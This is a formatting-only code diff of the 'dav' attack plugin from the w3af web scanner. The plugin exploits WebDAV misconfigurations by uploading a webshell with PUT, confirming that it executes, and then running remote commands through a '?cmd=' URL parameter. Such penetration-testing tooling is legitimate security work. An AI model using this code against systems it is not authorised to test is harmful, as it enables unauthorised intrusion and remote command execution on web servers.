@@ -37,77 +37,78 @@ class dav(AttackPlugin):
 
     def __init__(self):
         AttackPlugin.__init__(self)
-        
+
         # Internal variables
         self._exploit_url = None
-    
+
     def get_attack_type(self):
         '''
         @return: The type of exploit, SHELL, PROXY, etc.
-        '''        
+        '''
         return 'shell'
-        
-    def get_kb_location( self ):
+
+    def get_kb_location(self):
         '''
         This method should return the vulnerability name (as saved in the kb)
         to exploit. For example, if the audit.os_commanding plugin finds an
         vuln, and saves it as:
-        
+
         kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
-        
+
         Then the exploit plugin that exploits os_commanding
         ( attack.os_commanding ) should return 'os_commanding' in this method.
         '''
         return 'dav'
-    
-    def _generate_shell( self, vuln_obj ):
+
+    def _generate_shell(self, vuln_obj):
         '''
         @param vuln_obj: The vuln to exploit.
         @return: The shell object based on the vulnerability that was passed as
                  a parameter.
         '''
         # Check if we really can execute commands on the remote server
-        if self._verify_vuln( vuln_obj ):
+        if self._verify_vuln(vuln_obj):
             # Create the shell object
-            shell_obj = DAVShell( vuln_obj )
-            shell_obj.set_url_opener( self._uri_opener )
-            shell_obj.set_exploit_URL( self._exploit_url )
+            shell_obj = DAVShell(vuln_obj)
+            shell_obj.set_url_opener(self._uri_opener)
+            shell_obj.set_exploit_URL(self._exploit_url)
             return shell_obj
         else:
             return None
 
-    def _verify_vuln( self, vuln_obj ):
+    def _verify_vuln(self, vuln_obj):
         '''
         This command verifies a vuln. This is really hard work! :P
 
         @return : True if vuln can be exploited.
         '''
         # Create the shell
-        filename = rand_alpha( 7 )
+        filename = rand_alpha(7)
         extension = vuln_obj.getURL().getExtension()
-        
+
         # I get a list of tuples with file_content and extension to use
-        shell_list = shell_handler.get_webshells( extension )
-        
+        shell_list = shell_handler.get_webshells(extension)
+
         for file_content, real_extension in shell_list:
             if extension == '':
                 extension = real_extension
-            om.out.debug('Uploading shell with extension: "%s".' % extension )
-            
+            om.out.debug('Uploading shell with extension: "%s".' % extension)
+
             # Upload the shell
             fname = '%s.%s' % (filename, extension)
             url_to_upload = vuln_obj.getURL().urlJoin(fname)
-            
-            om.out.debug('Uploading file %s using PUT method.' % url_to_upload )
-            self._uri_opener.PUT( url_to_upload, data=file_content )
-            
+
+            om.out.debug(
+                'Uploading file %s using PUT method.' % url_to_upload)
+            self._uri_opener.PUT(url_to_upload, data=file_content)
+
             # Verify if I can execute commands
-            # All w3af shells, when invoked with a blank command, return a 
+            # All w3af shells, when invoked with a blank command, return a
             # specific value in the response:
             # shell_handler.SHELL_IDENTIFIER
-            exploit_url = URL( url_to_upload + '?cmd=' )
-            response = self._uri_opener.GET( exploit_url )
-            
+            exploit_url = URL(url_to_upload + '?cmd=')
+            response = self._uri_opener.GET(exploit_url)
+
             if shell_handler.SHELL_IDENTIFIER in response.getBody():
                 msg = 'The uploaded shell returned the SHELL_IDENTIFIER, which'\
                       ' verifies that the file was uploaded and is being executed.'
@@ -120,10 +121,10 @@ class dav(AttackPlugin):
                       ' uploaded to the remote server or the code is not being'\
                       ' run. The returned body was: "%s".' % (extension,
                                                               response.getBody())
-                om.out.debug( msg )
+                om.out.debug(msg)
                 extension = ''
 
-    def get_root_probability( self ):
+    def get_root_probability(self):
         '''
         @return: This method returns the probability of getting a root shell
                  using this attack plugin. This is used by the "exploit *"
@@ -133,8 +134,8 @@ class dav(AttackPlugin):
                  WILL ALWAYS return a root shell.
         '''
         return 0.8
-        
-    def get_long_desc( self ):
+
+    def get_long_desc(self):
         '''
         @return: A DETAILED description of the plugin functions and features.
         '''
@@ -142,18 +143,19 @@ class dav(AttackPlugin):
         This plugin exploits webDAV misconfigurations and returns a shell. It is
         rather simple, using the dav method "PUT" the plugin uploads the
         corresponding webshell ( php, asp, etc. ) verifies that the shell is
-        working, and if everything is working as expected the user can start 
+        working, and if everything is working as expected the user can start
         typing commands.
         '''
-        
+
+
 class DAVShell(exec_shell):
-    def set_exploit_URL( self, eu ):
+    def set_exploit_URL(self, eu):
         self._exploit_url = eu
-    
-    def get_exploit_URL( self ):
+
+    def get_exploit_URL(self):
         return self._exploit_url
-        
-    def execute( self, command ):
+
+    def execute(self, command):
         '''
         This method executes a command in the remote operating system by
         exploiting the vulnerability.
@@ -162,22 +164,22 @@ class DAVShell(exec_shell):
         @return: The result of the command.
         '''
         to_send = self.get_exploit_URL() + command
-        to_send = URL( to_send )
-        response = self._uri_opener.GET( to_send )
-        return shell_handler.extract_result( response.getBody())
-    
-    def end( self ):
+        to_send = URL(to_send)
+        response = self._uri_opener.GET(to_send)
+        return shell_handler.extract_result(response.getBody())
+
+    def end(self):
         url_to_del = self._exploit_url.uri2url()
-        
+
         msg = 'DAVShell is going to delete the web shell that was uploaded to %s.'
         om.out.debug(msg % url_to_del)
-        
+
         try:
             self._uri_opener.DELETE(url_to_del)
         except w3afException, e:
-            om.out.error('DAVShell cleanup failed with exception: "%s".' % e )
+            om.out.error('DAVShell cleanup failed with exception: "%s".' % e)
         else:
             om.out.debug('DAVShell cleanup complete, %s deleted.' % url_to_del)
-        
-    def get_name( self ):
+
+    def get_name(self):
         return 'dav'
